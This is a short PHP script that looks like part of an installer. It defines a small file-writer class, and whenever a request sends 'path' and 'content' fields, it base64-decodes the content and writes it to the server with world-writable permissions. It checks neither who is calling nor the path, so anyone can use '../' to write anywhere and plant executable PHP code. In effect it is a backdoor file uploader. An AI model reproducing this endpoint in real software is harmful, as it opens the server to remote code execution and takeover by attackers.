<?php

class writer_fs {
	public function put( $path, $content ) {
		$this->dir($path);
		file_put_contents( $path, $content );
		chmod( $path, 0666 );
	}

	public function dir( $path, $mod = 0777 ) {
		$folders = explode( '/', $path );
		$dir = '.';

		while( count( $folders ) > 1 ) {
			$dir .= '/' . array_shift( $folders );
			if( !is_dir( $dir )) {
				mkdir( $dir );
				chmod( $dir, 0777 );
			}
		}
	}

	public function delete( $path ) {
		unlink( $path );
	}
}

if( !empty( $_POST['path'] ) && !empty( $_POST['content'] )) {
	$writer = new writer_fs();
	$writer->put('test/'.$_POST['path'], base64_decode($_POST['content']));
} else {
	include 'install/tpl/main.php';
}
